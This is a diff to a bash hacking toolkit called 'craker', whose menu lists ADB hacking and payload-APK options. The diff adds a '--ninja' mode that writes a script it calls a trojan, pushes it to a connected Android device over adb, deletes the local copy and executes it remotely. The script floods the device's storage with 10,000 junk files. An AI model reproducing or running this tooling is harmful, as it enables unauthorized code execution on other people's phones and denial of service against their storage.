@@ -33,6 +33,7 @@ banner 34
 echo -e "./craker --adb \e[2mAdb hacking tool\e[0m"
 echo -e "./craker --msfpay \e[2mCreated payload apk\e[0m"
 echo -e "./craker --uppay \e[2mUp to payloads\e[0m"
+echo -e "./craker --ninja \e[2mInject space payload\e[0m"
 elif [[ $@ == "--adb" ]]
 then
 banner 35
@@ -128,7 +129,37 @@ then
 echo -e "\e[34m[+]\e[0m File to up $3 "
 python -m webbrowser -n http://localhost:8080/$3
 php -S localhost:8000 | grep 'http'
-else
+elif [[ $@ == "--ninja" ]]
+then
+banner 33
+echo -e "ninja: --injec \e[2mStart injection, fill the space\e[0m"
+elif [[ $2 == "--injec" ]]
+then 
+echo -e "\e[34m[+]\e[0m creating troyan file"
+sleep 1
+echo -e "\e[34m[+]\e[0m his name is ninja.sh"
+sleep 1
+echo -e "\e[34m[+]\e[0m trojan created successfully"
+sleep 1
+echo '
+echo -e "\e[32m▐ ▄ ▪   ▐ ▄  ▐▄▄▄ ▄▄▄·
+•█▌▐███ •█▌▐█  ·██▐█ ▀█
+▐█▐▐▌▐█·▐█▐▐▌▪▄ ██▄█▀▀█
+██▐█▌▐█▌██▐█▌▐▌▐█▌▐█ ▪▐▌
+▀▀ █▪▀▀▀▀▀ █▪ ▀▀▀• ▀  ▀ \e[0m"
+for i in $(seq 1 10000)
+do
+touch ninja-exploit-$i
+echo -e "\e[32m Archived created $i\e[0m"
+done
+' > ninja.sh
+echo -e "\e[32m[+]\e[0m uploading trojan"
+adb push ninja.sh /sdcard > /dev/null 2>&1
+sleep 1
+rm ninja.sh
+echo -e "\e[32m[+]\e[0m starting trojan"
+sleep 1
+adb shell sh /sdcard/ninja.sh
 echo -e "use: ./craker --help"
 fi
 }
